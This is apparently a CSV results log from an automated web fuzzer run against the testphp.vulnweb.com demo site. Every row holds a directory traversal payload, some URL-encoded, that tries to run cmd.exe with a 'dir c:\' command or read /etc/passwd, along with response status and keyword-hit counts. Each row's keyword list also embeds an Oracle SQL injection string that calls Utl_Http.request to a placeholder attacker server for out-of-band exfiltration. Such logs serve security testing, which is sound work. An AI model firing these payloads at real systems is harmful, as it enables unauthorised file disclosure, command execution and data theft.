id_fuzz,#,Payload,URL,Method,StatusCode,SearchKeyword,TimeDelay,ContentLength
id_fuzz_1,24,,http://testphp.vulnweb.com/listproducts.php?cat=..%5c..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 1, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,25,,http://testphp.vulnweb.com/listproducts.php?cat=..%5c..%5c..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 1, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,26,,http://testphp.vulnweb.com/listproducts.php?cat=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 1, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,27,,http://testphp.vulnweb.com/listproducts.php?cat=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 1, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,28,,http://testphp.vulnweb.com/listproducts.php?cat=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 1, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,29,,http://testphp.vulnweb.com/listproducts.php?cat=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 1, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,30,,http://testphp.vulnweb.com/listproducts.php?cat=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 1, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,31,,http://testphp.vulnweb.com/listproducts.php?cat=%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 1, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,32,,http://testphp.vulnweb.com/listproducts.php?cat=%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 1, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,33,,http://testphp.vulnweb.com/listproducts.php?cat=%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 1, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,34,,http://testphp.vulnweb.com/listproducts.php?cat=../../../../../../../../../etc/passwd,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,35,,http://testphp.vulnweb.com/listproducts.php?cat=../../../../../../../../etc/passwd,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,36,,http://testphp.vulnweb.com/listproducts.php?cat=../../../../../../../etc/passwd,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,37,,http://testphp.vulnweb.com/listproducts.php?cat=../../../../../../etc/passwd,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,38,,http://testphp.vulnweb.com/listproducts.php?cat=../../../../../etc/passwd,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,39,,http://testphp.vulnweb.com/listproducts.php?cat=../../../../etc/passwd,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,40,,http://testphp.vulnweb.com/listproducts.php?cat=../../../etc/passwd,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,41,,http://testphp.vulnweb.com/listproducts.php?cat=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,42,,http://testphp.vulnweb.com/listproducts.php?cat=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
